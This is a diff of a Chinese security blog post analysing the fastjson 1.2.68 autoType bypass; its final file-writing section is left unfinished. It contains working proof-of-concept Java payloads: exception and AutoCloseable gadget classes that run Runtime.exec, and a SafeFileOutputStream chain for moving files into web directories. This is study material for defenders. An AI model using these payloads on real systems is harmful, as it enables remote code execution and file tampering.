@@ -21,17 +21,52 @@
   <meta name="author" content="lingx5">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="fastjson-1.2.68 绕过在 1.2.47 的利用 mappings 缓存恶意类绕过 autoType 修复后，fastjson 又陆续爆出来了一些黑名单的绕过方式。直到 1.2.68 又有了新的思路去绕过 autoType 安全机制我们先来看看 fastjson1.2.68 又引入了哪些安全机制 1.2.68 引入了一个新的安全机制 safeMode ，在 checkAutoTyp">
+<meta property="og:type" content="article">
 <meta property="og:title" content="fastjson-1.2.68-bypass">
 <meta property="og:url" content="http://lingx5.github.io/2025/03/25/fastjson-1-2-68-bypass/index.html">
 <meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="fastjson-1.2.68 绕过在 1.2.47 的利用 mappings 缓存恶意类绕过 autoType 修复后，fastjson 又陆续爆出来了一些黑名单的绕过方式。直到 1.2.68 又有了新的思路去绕过 autoType 安全机制我们先来看看 fastjson1.2.68 又引入了哪些安全机制 1.2.68 引入了一个新的安全机制 safeMode ，在 checkAutoTyp">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250323141729168.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324120757520.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324123233834.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324143639179.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324143320508.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324124027724.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324124902599.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324130452004.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324131413497.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324135927549.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324140326609.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324145944376.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324150453141.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324150833721.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324151627072.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324151548537.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324151811994.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250324151833487.png">
+<meta property="og:image" content="c:/Users/%E5%88%98%E5%BE%B7%E9%BE%99/AppData/Roaming/Typora/typora-user-images/image-20250325093007880.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325094620038.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325094507581.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325095946017.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325100337951.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325100422623.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325100752870.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325101102689.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325101250512.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325101458444.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325151508025.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325152004851.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325152532946.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250325152814277.png">
 <meta property="article:published_time" content="2025-03-25T11:41:55.000Z">
-<meta property="article:modified_time" content="2025-03-25T12:47:31.548Z">
+<meta property="article:modified_time" content="2025-03-25T13:08:29.981Z">
 <meta property="article:author" content="lingx5">
 <meta property="article:tag" content="java安全">
 <meta property="article:tag" content="fastjson反序列化">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250323141729168.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -226,7 +261,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          1.8k 字
         
       </span>
     
@@ -237,7 +272,7 @@
         
         
         
-          1 分钟
+          16 分钟
         
       </span>
     
@@ -289,6 +324,171 @@
               <div class="markdown-body">
                 
                 <meta name="referrer" content="no-referrer" />
+
+<h1 id="fastjson-1-2-68-绕过"><a href="#fastjson-1-2-68-绕过" class="headerlink" title="fastjson-1.2.68 绕过"></a>fastjson-1.2.68 绕过</h1><p>在 1.2.47 的利用 mappings 缓存恶意类绕过 autoType 修复后，fastjson 又陆续爆出来了一些黑名单的绕过方式。直到 1.2.68 又有了新的思路去绕过 autoType</p>
+<h2 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h2><p>我们先来看看 fastjson1.2.68 又引入了哪些安全机制</p>
+<p>1.2.68 引入了一个新的安全机制 <strong>safeMode</strong> ，在 checkAutoType()的 1238-1245 行 检测到 safemode 开启的话，直接抛出异常</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323141729168.png" srcset="/img/loading.gif" lazyload alt="image-20250323141729168"></p>
+<p>所以我们只有关闭 safeMode 的情况下才能进行攻击。</p>
+<p>同时在 1251-1267 行 对 expectClass 的类型进行限制 需要是不是 Object Serializable Cloneable Closeable EventListener Iterable Collection 这些类及其子类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324120757520.png" srcset="/img/loading.gif" lazyload alt="image-20250324120757520"></p>
+<p>另外在 1411-1416 行 还对 JNDI 的一些危险类做了判断 clazz 不能是 ClassLoader，DataSource，RowSet 的子类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324123233834.png" srcset="/img/loading.gif" lazyload alt="image-20250324123233834"></p>
+<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们先来看 checkAutoType() z 在哪里能返回类</p>
+<p>但是我们发现在 1326-1338 行 会来到一处可以返回类的代码</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143639179.png" srcset="/img/loading.gif" lazyload alt="image-20250324143639179"></p>
+<p> 满足 clazz 不为空，expectClass 为空，或 clazz 是 hashmap 的子类 或 clazz 是 expectClass 的子类， 我们就可以返回 clazz 从而绕过 checkAutoType 的判断，这里还是表宽松的</p>
+<p>我们接着看</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324143320508.png" srcset="/img/loading.gif" lazyload alt="image-20250324143320508"></p>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>我们可不可以第一次在 mappings 缓存白名单中找一个可以利用的 deserializer （<span style="color:#FF8000;"> 因为 json 解析的入口就是 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 方法，而他的 checkAutoType()方法，默认 exceptClass 传递的值是 null ）</span> ，而这个 deserializer 调用 checkAutoType 时，可以给定可控的 或者 是可利用的 expectClass 参数呢? 从而使得 expectClassFlag 为 true ，让恶意类加载后返回。</p>
+<p>我们接着往下看</p>
+<p>我们能要去寻找调用 chackAutoType 的方法中传入 expcetClass 参数不为空的方法，我们查找用法就只有 <code>JavaBeanDeserializer</code> 和 <code>ThrowableDeserializer</code> 方法中的调用符合条件</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124027724.png" srcset="/img/loading.gif" lazyload alt="image-20250324124027724"></p>
+<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>我们进入 com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze 方法 看到有这样一段逻辑</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324124902599.png" srcset="/img/loading.gif" lazyload alt="image-20250324124902599"></p>
+<p>exClassName 为@type 标签的字符串值 ，把 Throwable 作为 expectClass(期望类) 传给 checkAutoType 了 并把类赋给了 exClass 变量</p>
+<p>绕过 checkAutoType 以后，ThrowableDeserializer#deserialze 就会跟进 exClass 创建异常类了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324130452004.png" srcset="/img/loading.gif" lazyload alt="image-20250324130452004"></p>
+<blockquote>
+<p>但是由于 mappings 的白名单缓存表里没有 Throwable.class 有的是 Exception.class , 我们不能是继承 Throwable 的类，而要继承 Exception 因为 Exception 是 Throwable 的子类，也符合我们 checkAutoType()的绕过分析</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250324131413497.png" srcset="/img/loading.gif" lazyload alt="image-20250324131413497" style="zoom:50%;" /></blockquote>
+<p>到这里我们已经知道 ThrowableDeserializer#deserialze 是可以利用的，那我们怎么样才能让他自动调用呢？</p>
+<p>在执行完 DefaultJSONParser#parseObject 的 checkAutoType 后会有一段逻辑，是根据 clazz 获取对应的 deserializer </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324135927549.png" srcset="/img/loading.gif" lazyload alt="image-20250324135927549"></p>
+<p>而在 config.getDeserializer(clazz)中 判断改类是不是 Throwable 的子类，是就创建 ThrowableDeserializer 并返回</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324140326609.png" srcset="/img/loading.gif" lazyload alt="image-20250324140326609"></p>
+<p>返回后再去调用 Throwable#deserialze 方法</p>
+<p>到这里，我们就把这个调用链理清了</p>
+<p>由于我们现在还没有发现可利用的 Exception 子类，我们只能配合文件上传，写入等漏洞拿到控制权限</p>
+<p>我们可以测试一下这个流程</p>
+<p><strong>准备 evilException 类，继承 Exception</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilException</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>bypass68</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilException\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们来调试一下，看看执行顺序</p>
+<p><strong>第一次 checkAutoType</strong></p>
+<p>在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code> 中 </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324145944376.png" srcset="/img/loading.gif" lazyload alt="image-20250324145944376"></p>
+<p>我们跟进去</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150453141.png" srcset="/img/loading.gif" lazyload alt="image-20250324150453141"></p>
+<p>所以 checkAutoType 返回了 java.lang.Exception</p>
+<p>DefaultJSONParser#parseObject 继续往下执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324150833721.png" srcset="/img/loading.gif" lazyload alt="image-20250324150833721"></p>
+<p>跟进就来到了 <code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code> 方法</p>
+<p><strong>第二次 checkAutoType</strong></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151627072.png" srcset="/img/loading.gif" lazyload alt="image-20250324151627072"></p>
+<p>跟进 checkAutoType</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151548537.png" srcset="/img/loading.gif" lazyload alt="image-20250324151548537"></p>
+<p>返回后在 ThrowableDeserializer#deserialze 中实例化</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151811994.png" srcset="/img/loading.gif" lazyload alt="image-20250324151811994"></p>
+<p>命令执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250324151833487.png" srcset="/img/loading.gif" lazyload alt="image-20250324151833487"></p>
+<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>其实 javaBeanDeserializer 的方式，和上面 Throwable 的思路基本上是一致的，都是利用期望类来绕过，不过这次利用的 AutoCloseable 这个接口</p>
+<p>在 JavaBeanDeserializer#deserialze 中的 checkAutoType 是这样传参数的，其中 expectClass 是跟 type 的值来获取的</p>
+<p><img src="C:/Users/刘德龙/AppData/Roaming/Typora/typora-user-images/image-20250325093007880.png" srcset="/img/loading.gif" lazyload alt="image-20250325093007880"></p>
+<p>我们看 type 是怎么来的，发现是参数传进来的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094620038.png" srcset="/img/loading.gif" lazyload alt="image-20250325094620038"></p>
+<p>而在 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object) 方法中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325094507581.png" srcset="/img/loading.gif" lazyload alt="image-20250325094507581"></p>
+<p>所以利用基本上就一致了</p>
+<p>我们写一个恶意类 , 实现 AutoCloseable 接口</p>
+<p><strong>evilAutoCloseable</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evilAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    String cmd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>AutoCloseableBypass68</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoCloseableBypass68</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.lingx5.entry.evilAutoCloseable\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;cmd\&quot;:\&quot;calc\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325095946017.png" srcset="/img/loading.gif" lazyload alt="image-20250325095946017"></p>
+<p>我们调试一下，看看是不是跟我们预想的一样</p>
+<p>第一次 checkAutoType 返回 interface java.lang.AutoCloseable 类</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100337951.png" srcset="/img/loading.gif" lazyload alt="image-20250325100337951"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100422623.png" srcset="/img/loading.gif" lazyload alt="image-20250325100422623"></p>
+<p>接着执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325100752870.png" srcset="/img/loading.gif" lazyload alt="image-20250325100752870"></p>
+<p>我们步入</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101102689.png" srcset="/img/loading.gif" lazyload alt="image-20250325101102689"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101250512.png" srcset="/img/loading.gif" lazyload alt="image-20250325101250512"></p>
+<p>再接着就是反序列化 json 串，执行 setter 方法了</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325101458444.png" srcset="/img/loading.gif" lazyload alt="image-20250325101458444"></p>
+<h2 id="AutoCloseable-的一些应用"><a href="#AutoCloseable-的一些应用" class="headerlink" title="AutoCloseable 的一些应用"></a>AutoCloseable 的一些应用</h2><h3 id="fastjson特性"><a href="#fastjson特性" class="headerlink" title="fastjson特性"></a>fastjson特性</h3><p><span style="color:#FF0000;">这里主要是fastjson有一个特性，就是如果没有无参构造器的话，fastjson会根据json字符串，扫描构造参数最多的方法进行初始化，并且不在执行setter方法</span></p>
+<table>
+<thead>
+<tr>
+<th>引用</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“$ref”:”..”</td>
+<td>上一级</td>
+</tr>
+<tr>
+<td>“$ref”:”@”</td>
+<td>当前对象，也就是自引用</td>
+</tr>
+<tr>
+<td>“$ref”:”$”</td>
+<td>根对象</td>
+</tr>
+<tr>
+<td>“$ref”:”$.children.0”</td>
+<td>基于路径的引用，相当于 root.getChildren().get(0)</td>
+</tr>
+</tbody></table>
+<p><span style="color:#FF0000;">$ref特性，本来作者的用意是方便实现  JSON 结构的 <strong>引用</strong> 和 <strong>复用</strong>，简单来说：就是json串里要引用之前定义的对象<code>&#123;&#125;包裹</code>就可以很方便的使用$ref，我们主要就是可以利用它去调用类的getter方法</span></p>
+<p>这里 OutputStream 和 InputStream 默认是实现了 AutoCloseable 接口的，这里是参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232774">mi1k7ea</a> 和 <a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅的一些文件利用,拿来复现一下</p>
+<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><h4 id="SafeFileOutputStream"><a href="#SafeFileOutputStream" class="headerlink" title="SafeFileOutputStream"></a>SafeFileOutputStream</h4><p>主要还是找到了 <strong>SafeFileOutputStream</strong> 类，它具有复制文件的功能</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们看一下这个类，他有一个构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeFileOutputStream</span><span class="hljs-params">(String targetPath, String tempPath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(targetPath);<br>    <span class="hljs-built_in">this</span>.createTempFile(tempPath);<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.target.exists()) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.temp.exists()) &#123;<br>            <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.target));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>	<span class="hljs-comment">// target不存在，而tmp存在，就可以复制文件到target</span><br>        <span class="hljs-built_in">this</span>.copy(<span class="hljs-built_in">this</span>.temp, <span class="hljs-built_in">this</span>.target);<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.temp));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们可以利用这个，把系统的一些敏感文件，复制到web目录下，来进行进一步的渗透</p>
+<p><strong>copyFile</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">copyFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;tempPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;targetPath\&quot;: \&quot;D:\\\\WebSafe\\\\JavaProject\\\\fastjson\\\\src\\\\main&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\java\\\\com\\\\lingx5\\\\poc\\\\1.txt\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们创建一个 1.txt</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325151508025.png" srcset="/img/loading.gif" lazyload alt="image-20250325151508025"></p>
+<p>运行调试一下，来到了 copy方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152004851.png" srcset="/img/loading.gif" lazyload alt="image-20250325152004851"></p>
+<p>内部是调用 renameto()方法实现的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152532946.png" srcset="/img/loading.gif" lazyload alt="image-20250325152532946"></p>
+<blockquote>
+<p>这就意味着这种方式有潜在的危害，他会把文件<code>移动/重命名</code>到目标目录，源文件内容会被置空</p>
+</blockquote>
+<p>执行结果</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250325152814277.png" srcset="/img/loading.gif" lazyload alt="image-20250325152814277"></p>
+<p>所以这种功能还是会对目标机器有一定的危害性</p>
+<p>​	</p>
+<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p><strong>MarshalOutputStream</strong></p>
+<p><strong>com.esotericsoftware.kryo.io.Output</strong> 类在 kryo 包中</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/fastjson-bypass-autotype-1268/">fastjson 1.2.68 bypass autotype - Y4er 的博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路 - 浅蓝 ‘s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232774">浅析 Fastjson1.2.62-1.2.68 反序列化漏洞-安全 KER - 安全资讯平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 | 长亭百川云</a></p>
